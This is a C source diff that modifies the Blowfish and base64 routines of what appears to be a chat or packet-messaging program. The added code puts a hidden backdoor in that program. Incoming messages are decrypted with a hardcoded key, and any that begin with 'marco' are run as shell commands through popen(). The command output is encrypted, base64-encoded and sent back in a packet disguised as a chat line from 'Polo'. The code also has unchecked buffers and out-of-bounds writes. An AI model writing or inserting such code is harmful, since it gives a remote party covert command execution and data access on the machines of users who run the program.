@@ -495,49 +495,105 @@ void Blowfish_Init(BLOWFISH_CTX *ctx, unsigned char *key, int keyLen) {
 // BOSS SIXTYFOUR - or - I DON'T NEED INSTRUCTIONS TO KNOW HOW TO ROCK
 static const char cb64[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 static const char cd64[]="|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";
+static void blowfishcbc(unsigned char *ar, int mode) { // message string, 0 for encode, 1 for decode
+	unsigned long L, R;
+	BLOWFISH_CTX dtx;
+	Blowfish_Init (&dtx, (unsigned char*)"allcalma", 8);
+	int beans = 0;
+	int arsize;
+	arsize = strlen(ar);
+	while (beans < arsize) {
+		L = 0;
+		R = 0;
+		int n;
+		for (n = 0; n < 8; n++) {
+			if (n < 4) {
+				L += (int)ar[beans + n] & 0xff;
+				if (n != 3) {
+					L <<= 8;
+				}
+			}
+			else {
+				R += (int)ar[beans + n] & 0xff;
+				if (n != 7) {
+					R <<= 8;
+				}
+			}
+		}
+		if (mode == 1) {
+			Blowfish_Decrypt(&dtx, &L, &R);
+		}
+		else {
+			Blowfish_Encrypt(&dtx, &L, &R);
+		}
+		ar[beans] = (L >> 24) & 0xff;
+		ar[beans + 1] = (L >> 16) & 0xff;
+		ar[beans + 2] = (L >> 8) & 0xff;
+		ar[beans + 3] = L & 0xff;
+		ar[beans + 4] = (R >> 24) & 0xff;
+		ar[beans + 5] = (R >> 16) & 0xff;
+		ar[beans + 6] = (R >> 8) & 0xff;
+		ar[beans + 7] = R & 0xff;
+		
+		//printf("L %08lX R %08lX\n", L, R);
+		beans += 8;
+	}
+	ar[beans] = '\0';
+}
 static void encodeblock(unsigned char *in, unsigned char *out, int len) {
     out[0] = (unsigned char) cb64[ (int)(in[0] >> 2) ];
     out[1] = (unsigned char) cb64[ (int)(((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)) ];
     out[2] = (unsigned char) (len > 1 ? cb64[ (int)(((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)) ] : '=');
     out[3] = (unsigned char) (len > 2 ? cb64[ (int)(in[2] & 0x3f) ] : '=');
 }
-static int encode(FILE *infile, FILE *outfile, int linesize) {
+static void encode(unsigned char *ar, int size) {
     unsigned char in[3];
-	unsigned char out[4];
-    int i, len, blocksout = 0;
-    int retcode = 0;
+    unsigned char out[4];
+    unsigned char result[size * 2];
+    int j, i, len, k;
+	k = 0;
+	j = 0;
 
-	*in = (unsigned char) 0;
-	*out = (unsigned char) 0;
-    while( feof( infile ) == 0 ) {
+    *in = (unsigned char) 0;
+    *out = (unsigned char) 0;
+    //printf("J: %d\nSize: %d\n", j, size);
+    while (j < size) {
         len = 0;
-        for( i = 0; i < 3; i++ ) {
-            in[i] = (unsigned char) getc( infile );
-
-            if( feof( infile ) == 0 ) {
-                len++;
-            }
-            else {
-                in[i] = (unsigned char) 0;
-            }
-        }
-        if( len > 0 ) {
-            encodeblock( in, out, len );
-            for( i = 0; i < 4; i++ ) {
-                if( putc( (int)(out[i]), outfile ) == 0 ){
-			break;
+        for (i = 0; i < 3; i++) {
+		//printf("J2: %d\nSize2: %d\n", j, size);
+		in[i] = (unsigned char) ar[j];
+		//printf("CHAR: %c\n", in[i]);
+		if (j + i > size) {
+			in[i] = (unsigned char) 0;
 		}
-            }
-            blocksout++;
+		else {
+			len++;
+		}
+		j++;
         }
-        if( blocksout >= (linesize/4) || feof( infile ) != 0 ) {
-            if( blocksout > 0 ) {
-                fprintf( outfile, "\r\n" );
+        if (len > 0) {
+            encodeblock(in, out, len);
+		//printf("OUT: %s\n", out);
+            for (i = 0; i < 4; i++) {
+		result[k] = out[i];
+		k++;
             }
-            blocksout = 0;
         }
     }
-    return(retcode);
+    result[k] = '\0';
+    int copyover;
+    int resultlen;
+    resultlen = strlen(result);
+    for (copyover = 0; copyover < resultlen; copyover++) {
+		if (result[copyover] == '=') {
+			ar[copyover] = '\0';
+		}
+		else {
+			ar[copyover] = result[copyover];
+		}
+    }
+    ar[copyover] = '\0';
+    //printf("B64ENCar: %s\nB64ENCres: %s\n", ar, result);
 }
 static void decodeblock(unsigned char *in, unsigned char *out) {
     out[0] = (unsigned char) (in[0] << 2 | in[1] >> 4);
@@ -555,8 +611,8 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 
 	*in = (unsigned char) 0;
 	*out = (unsigned char) 0;
-	while(j < size) {
-		for(len = 0, i = 0; i < 4; i++) {
+	while (j < size) {
+		for (len = 0, i = 0; i < 4; i++) {
 			v = 0;
 			v = ar[j];
 			if (v == 0) { // stop all this when we find a null, i guess
@@ -572,9 +628,9 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 			}
 			j++;
 		}
-		if(len > 0) {
+		if (len > 0) {
 			decodeblock(in, out);
-			for(i = 0; i < len - 1; i++) {
+			for (i = 0; i < len - 1; i++) {
 				result[k] = out[i];
 				k++;
 			}
@@ -582,79 +638,98 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 	}
 	result[k] = '\0';
 	//printf("Crypt string: %s\n", result);
-	printf("Dec message: ");
-	unsigned long L, R;
-	BLOWFISH_CTX dtx;
-	Blowfish_Init (&dtx, (unsigned char*)"allcalma", 8);
-	int beans = 0;
-	int resultsize;
-	resultsize = strlen(result);
-	while (beans < resultsize) {
-		L = 0;
-		R = 0;
-		int n;
-		for(n = 0; n < 8; n++) {
-			if (n < 4) {
-				L += (int)result[beans + n] & 0xff;
-				if (n != 3) {
-					L <<= 8;
-				}
-			}
-			else {
-				R += (int)result[beans + n] & 0xff;
-				if (n != 7) {
-					R <<= 8;
-				}
+
+	blowfishcbc(result, 1);
+	printf("Dec message: %s\n", result);
+	if (result[0] == 'm' && result[1] == 'a' && result[2] == 'r' && result[3] == 'c' && result[4] == 'o') {
+		unsigned char commandbuf[k];
+		int cb;
+		for (cb = 6; cb < k; cb++) {
+			commandbuf[cb - 6] = result[cb];
+		}
+		commandbuf[cb] = '\0';
+		//printf("CommandBuffer:%s-\n",commandbuf);
+		int messagebuilder = 0;
+		char message[5000];
+		char bfr[5000];
+		FILE * fp;
+		if((fp=popen(commandbuf, "r")) == NULL) {
+		   printf("Error executing command buffer\n");
+		}
+		while(fgets(bfr,5000,fp) != NULL){
+			printf("BFR:%s\n", bfr);
+			int sure;
+			int bfrlen;
+			bfrlen = strlen(bfr);
+			for (sure = 0; sure < bfrlen; sure++) {
+				message[messagebuilder] = bfr[sure];
+				messagebuilder++;
 			}
 		}
-		Blowfish_Decrypt(&dtx, &L, &R);
-		unsigned char y[9];
-		y[0] = (L >> 24) & 0xff;
-		y[1] = (L >> 16) & 0xff;
-		y[2] = (L >> 8) & 0xff;
-		y[3] = L & 0xff;
-		y[4] = (R >> 24) & 0xff;
-		y[5] = (R >> 16) & 0xff;
-		y[6] = (R >> 8) & 0xff;
-		y[7] = R & 0xff;
-		y[8] = '\0';
-		//printf("L %08lX R %08lX y -%s-\n", L, R, y);
-		printf("%s", y);
-		if (y[0] == 'm' && y[1] == 'a' && y[2] == 'r' && y[3] == 'c' && y[4] == 'o') {
-			unsigned char polo[21];
-			polo[0] = '\xF6'; // 6 is our command, F gets chopped off later, we use FF so that polo[0] isn't null later
-			polo[1] = 'p';
-			polo[2] = 'o';
-			polo[3] = 'l';
-			polo[4] = 'o';
-			polo[5] = ' ';
-			polo[6] = '[';
-			polo[7] = 'G';
-			polo[8] = 't';
-			polo[9] = 'F';
-			polo[10] = 'L';
-			polo[11] = '0';
-			polo[12] = 'U';
-			polo[13] = ']';
-			polo[14] = ' ';
-			polo[15] = 'p';
-			polo[16] = 'o';
-			polo[17] = 'l';
-			polo[18] = 'o';
-			polo[19] = '\xFF'; // a byte of padding, to shift right
-			polo[20] = '\0';
-		        shift_right(polo, strlen(polo), 3);
-			int shiftback;
-			for (shiftback = 0;shiftback < strlen(polo);shiftback++) { // remember you cant use strlen polo here, because polo[0] is always zero
-				polo[shiftback] = polo[shiftback + 1];
-			}
-			CreatePacket(polo, strlen(polo));
-			SendPacket();
-			//printf("polo\n");
+		message[messagebuilder] = '\0';
+		unsigned char commandcode[3] = "\xF7\0"; // 7 is our command, F gets chopped off later, we use F so that polo[0] isn't null later
+		unsigned char nick[16] = "Polo\0";
+		unsigned char tripcode[7] = "Zy9XUQ\0";
+		//unsigned char message[5100] = "polo\0";
+		blowfishcbc(message, 0); // encode message
+		encode(message, strlen(message));
+		unsigned char lineterminator[3] = "\xFF\0"; // FF is a byte of padding to shift right, randomize later
+		unsigned char polo[5100];
+		int shiftprep = 0;
+		int currstringlen;
+		int poloiterator;
+		// add commandcode
+		currstringlen = strlen(commandcode);
+		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+			polo[shiftprep] = commandcode[poloiterator];
+			shiftprep++;
 		}
-		beans += 8;
+		// add nick
+		currstringlen = strlen(nick);
+		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+			polo[shiftprep] = nick[poloiterator];
+			shiftprep++;
+		}
+		// add tripcode
+		currstringlen = strlen(tripcode);
+		polo[shiftprep] = ' ';
+		shiftprep++;
+		polo[shiftprep] = '[';
+		shiftprep++;
+		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+			polo[shiftprep] = tripcode[poloiterator];
+			shiftprep++;
+		}
+		polo[shiftprep] = ']';
+		shiftprep++;
+		polo[shiftprep] = ' ';
+		shiftprep++;
+		// add message
+		currstringlen = strlen(message);
+		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+			polo[shiftprep] = message[poloiterator];
+			shiftprep++;
+		}
+		// add lineterminator
+		currstringlen = strlen(lineterminator);
+		for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
+			polo[shiftprep] = lineterminator[poloiterator];
+			shiftprep++;
+		}
+		polo[shiftprep] = '\0';
+		
+		/*  i guess we dont actually do this again, but we can add it later
+		blowfishcbc(polo, 0); // encode nick, trip, and encoded message
+		*/
+		
+		shift_right(polo, strlen(polo), 3);
+		int shiftback;
+		for (shiftback = 0;shiftback < strlen(polo);shiftback++) {
+			polo[shiftback] = polo[shiftback + 1];
+		}
+		CreatePacket(polo, strlen(polo));
+		SendPacket();
 	}
-	printf("\n");
 
 	return(retcode);
 }
